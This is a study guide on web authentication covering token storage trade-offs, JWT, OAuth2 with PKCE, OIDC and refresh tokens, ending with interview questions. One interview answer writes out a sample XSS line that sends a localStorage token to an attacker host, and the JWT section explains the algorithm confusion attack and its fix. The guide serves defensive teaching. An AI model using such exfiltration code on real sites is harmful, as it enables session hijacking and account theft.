# Auth & Authorization: JWT, OAuth2, OIDC, HttpOnly Cookies

## Quick Reference

| | HttpOnly Cookie | localStorage | Memory (JS variable) |
|---|---|---|---|
| XSS resistance | High (JS can't read) | None | High (tab-scoped) |
| CSRF exposure | Yes (auto-sent) | No | No |
| Survives refresh | Yes | Yes | No |
| Survives tab close | Session only (unless Persistent) | Yes | No |

| Protocol | Purpose |
|---|---|
| OAuth2 | Authorization — delegate access to resources |
| OIDC | Authentication — identity on top of OAuth2 |
| JWT | Token format — signed claims, not a protocol |

---

## What Is This?

Authentication is how your app verifies who a user is. Authorization is what that user is allowed to do. The token (JWT, session ID, opaque token) is the artifact the browser carries to prove identity on subsequent requests. Where and how you store and transmit that token determines your security posture.

---

## Token Storage Trade-offs

### HttpOnly Cookies

The server sets `Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Lax`.

- Browser automatically sends the cookie with every matching-origin request
- JavaScript cannot read the cookie — `document.cookie` doesn't include HttpOnly cookies
- **XSS-resistant** for token theft: an attacker can't exfiltrate the session token via JS
- **CSRF-exposed**: since the cookie is auto-sent, cross-site requests include it (mitigated by SameSite)
- Survives page refresh, tab close/reopen — until the cookie expires

HttpOnly cookies + SameSite=Lax + CSRF token is the gold standard for session management.

### localStorage

The token is stored in `localStorage` and attached to requests as `Authorization: Bearer <token>`.

- Survives refresh and tab close
- Not auto-sent (not CSRF-exposed)
- **Fully readable by any script in the origin** — XSS can steal the token directly with `localStorage.getItem('token')` and exfiltrate it. The session is then completely compromised.
- Persist across tabs in the same origin

localStorage for auth tokens is an anti-pattern. A stolen token can be used anywhere, indefinitely (until expiry). Unlike a session that can be server-side invalidated, a stolen JWT used from a different IP can't always be detected.

### Memory (JavaScript variable)

The token lives in a JS module or closure — not persisted anywhere:

```js
let authToken = null;

export function setToken(token) { authToken = token; }
export function getToken() { return authToken; }
```

- Destroyed when the tab closes or refreshes
- Not readable by attacker scripts in other modules (with proper encapsulation)
- XSS in the same page can still read module state — not immune, but limits blast radius
- Not CSRF-exposed (no auto-send)

Often combined with a refresh token in an HttpOnly cookie: the access token is in memory (short-lived), and the refresh token (HttpOnly cookie) is used to silently get new access tokens without a login form.

> **Check yourself:** If a token is stored in an HttpOnly cookie, what can an XSS attack do with it?

---

## JWT (JSON Web Token)

A JWT is a signed (and optionally encrypted) token containing claims. It's a *format*, not a protocol.

```
header.payload.signature
eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIiwiZXhwIjoxNzAwMDAwMDAwfQ.SIGNATURE
```

**Header** (Base64URL decoded):
```json
{ "alg": "RS256", "typ": "JWT" }
```

**Payload** (Base64URL decoded):
```json
{
  "sub": "user123",      // subject (user ID)
  "iss": "auth.example.com", // issuer
  "aud": "api.example.com",  // audience
  "exp": 1700000000,         // expiration (Unix timestamp)
  "iat": 1699996400          // issued at
}
```

**Signature**: cryptographic signature over header + payload, computed with the server's private key (RS256) or shared secret (HS256).

### How JWT verification works

```js
// Server (simplified):
const [header, payload, sig] = token.split('.');
const data = `${header}.${payload}`;
const isValid = crypto.verify(
  'sha256', 
  Buffer.from(data), 
  publicKey, 
  Buffer.from(sig, 'base64url')
);
// If valid, decode payload
const claims = JSON.parse(Buffer.from(payload, 'base64url').toString());
// Check exp, aud, iss
```

**JWTs are stateless** — the server doesn't need a database lookup to verify them (the signature proves they're authentic). The downside: they can't be invalidated before they expire. Once issued, a stolen JWT is valid until `exp`.

### JWT gotchas

**Algorithm confusion attack:** If the server accepts both HS256 and RS256, an attacker can change the header to `"alg": "HS256"` and sign with the server's public key (which is public) as the HS256 secret. The verification incorrectly passes. Fix: always specify the expected algorithm, never accept `alg` from the token header.

**`exp` is not checked automatically:** Libraries may provide `jwt.decode()` (no verification) vs. `jwt.verify()` (checks signature + claims). Always use `verify` with `algorithms` and `audience` specified.

**The payload is Base64URL encoded, not encrypted.** Anyone can decode it. Never put secrets in JWT payloads.

---

## OAuth2

OAuth2 is an authorization framework — it lets a user grant a third-party application limited access to their account on another service, without sharing their password.

**Flow (Authorization Code — most common):**

```
1. User clicks "Login with Google" → App redirects to Google's authorization endpoint
   GET https://accounts.google.com/o/oauth2/auth
     ?client_id=APP_ID
     &redirect_uri=https://myapp.com/callback
     &response_type=code
     &scope=email profile
     &state=RANDOM_CSRF_VALUE

2. User authenticates with Google and grants permission

3. Google redirects back to myapp.com/callback with:
   ?code=AUTH_CODE&state=RANDOM_CSRF_VALUE

4. App's server exchanges code for tokens (server-to-server, secret not exposed):
   POST https://oauth2.googleapis.com/token
   { code, client_id, client_secret, redirect_uri, grant_type: 'authorization_code' }

5. Google responds: { access_token, refresh_token, expires_in, id_token }

6. App uses access_token for API calls to Google on the user's behalf
```

**Why the code exchange happens server-side:** The `code` can be exchanged once for tokens. Doing it server-side keeps the `client_secret` off the browser. Intercepting the code alone (without the secret) is useless.

**`state` parameter:** Prevents CSRF on the OAuth callback. The app generates a random `state` value, stores it in the session, and verifies it matches when the callback fires.

### PKCE (Proof Key for Code Exchange)

For public clients (SPAs, mobile apps) that can't keep a `client_secret` secret, PKCE replaces the secret:

```
1. App generates: code_verifier = random string
2. App computes: code_challenge = SHA256(code_verifier), base64url-encoded
3. Authorization request includes: code_challenge, code_challenge_method=S256
4. Token exchange includes: code_verifier (not the hash)
5. Auth server hashes the verifier and compares to the stored challenge
```

An intercepted authorization code is useless without the `code_verifier`, which was never sent to the auth server's endpoint during the authorization step.

---

## OIDC (OpenID Connect)

OIDC is an authentication layer on top of OAuth2. OAuth2 says "this app can access these resources." OIDC adds "and here's who the user is."

OIDC adds the `id_token` — a JWT containing identity claims (`sub`, `email`, `name`, `picture`) — to the OAuth2 token response. The app verifies the `id_token` to learn the user's identity.

```json
// id_token payload (decoded):
{
  "iss": "https://accounts.google.com",
  "sub": "user-google-id-123",
  "aud": "your-client-id",
  "email": "user@example.com",
  "name": "Jane Doe",
  "exp": 1700000000,
  "iat": 1699996400,
  "nonce": "RANDOM" // prevents replay attacks
}
```

OIDC defines standard discovery: `https://issuer/.well-known/openid-configuration` returns the auth server's endpoints and public keys.

---

## The Refresh Token Flow

Access tokens are short-lived (15 minutes to 1 hour). Refresh tokens are long-lived (days to weeks) and used to get new access tokens without re-authentication.

```
1. Access token expires
2. Client sends: POST /token { grant_type: 'refresh_token', refresh_token: STORED_RT }
3. Server validates the refresh token, issues a new access token (and optionally rotates the refresh token)
4. Client stores the new access token
```

**Refresh token storage:** In a browser, the refresh token should be in an HttpOnly cookie — it's the most sensitive credential (long-lived). The access token can be in memory (short-lived, so losing it on tab close is acceptable).

**Refresh token rotation:** Each refresh token use issues a new refresh token and invalidates the old one. If a stolen refresh token is used, the legitimate user's next refresh will fail (old token rejected), signaling a compromise.

---

## Interview Questions

**Q (High): Why is storing auth tokens in localStorage a security anti-pattern?**

Answer: Any JavaScript executing on the page can read localStorage — `localStorage.getItem('token')`. This includes injected scripts (XSS), browser extensions, and any third-party script you've loaded. A successful XSS attack can exfiltrate the token to the attacker's server: `fetch('https://attacker.com/steal?t=' + localStorage.getItem('token'))`. The stolen token can then be used from anywhere until it expires. Unlike a server-managed session that can be invalidated, a stolen JWT cannot be recalled before its expiry. HttpOnly cookies prevent token theft via JavaScript entirely — the token never appears in JS context. The trade-off is CSRF exposure, which is mitigated by SameSite=Lax and CSRF tokens. For most applications, HttpOnly cookies are the correct storage for auth tokens.

**Q (High): Explain the OAuth2 Authorization Code flow. Why is the code exchanged server-side rather than in the browser?**

Answer: The flow: the app redirects the user to the auth server with `response_type=code`. After authentication, the auth server redirects back to the app with a short-lived authorization code in the URL. The app's server exchanges that code for access and refresh tokens by calling the auth server's token endpoint — including the `client_secret` in the request. The code exchange must happen server-side because the `client_secret` must be kept secret. If the browser performed the exchange, the secret would be in JavaScript and visible to anyone who inspects the app. An intercepted authorization code alone is useless — it can only be exchanged with the secret. For public clients (SPAs) without a server that can hold a secret, PKCE replaces the secret with a cryptographic challenge-verifier pair.

**Q (High): What is the difference between OAuth2 and OIDC?**

Answer: OAuth2 is an authorization framework — it defines how a user grants an application access to resources they own on another service. After OAuth2, you know the app is allowed to do certain things (read email, post on their behalf), but you don't know *who the user is*. OIDC (OpenID Connect) extends OAuth2 with an authentication layer by adding the `id_token` — a signed JWT containing identity claims (user ID, email, name). OIDC uses OAuth2's flows but adds a standardized identity layer, discovery document, and UserInfo endpoint. Think of it as: OAuth2 = "here's a key card for the building"; OIDC = "here's a key card, and here's the employee badge that says who you are."

**Q (Medium): What is the algorithm confusion attack on JWTs and how is it prevented?**

Answer: JWT headers contain an `alg` field indicating the signing algorithm. If a server accepts multiple algorithms including both asymmetric (RS256, verified with public key) and symmetric (HS256, verified with shared secret), an attacker can craft a token with `"alg": "HS256"` and sign it with the server's public key — which is public and obtainable. A naive verification that reads the algorithm from the token header would then use the public key as the HMAC secret, and the signature would verify. Prevention: the verification code must specify the expected algorithm explicitly, never reading it from the token header. Libraries should be called as: `jwt.verify(token, publicKey, { algorithms: ['RS256'] })`. The list of acceptable algorithms comes from configuration, not from the token.

**Q (Low): Describe the access token + refresh token storage strategy that balances XSS and refresh risk.**

Answer: The recommended pattern: access token stored in memory (a JavaScript variable/closure, not localStorage or sessionStorage), refresh token stored in an HttpOnly, Secure, SameSite=Strict cookie. The access token is short-lived (15 minutes), so losing it on tab close is acceptable — the refresh token silently gets a new one on the next page load. XSS can't steal the refresh token (HttpOnly) and can only abuse the access token until it expires (15 minutes of exposure window rather than the refresh token's days). The refresh token cookie's SameSite=Strict prevents CSRF abuse of the refresh endpoint. Refresh token rotation (new refresh token on each use) limits the damage from a stolen refresh token — the next legitimate refresh will invalidate it and signal a compromise.

---

## Self-Assessment

- [ ] Explain the three storage options for auth tokens and the security trade-off of each
- [ ] Describe the OAuth2 Authorization Code flow and why the token exchange is server-side
- [ ] Explain what OIDC adds to OAuth2 and what's in an id_token
- [ ] Describe the JWT algorithm confusion attack and how to prevent it
- [ ] Explain what makes a JWT stateless and what the downside of that is

---
*Next: Subresource Integrity (SRI) — hash validation for CDN-served assets.*
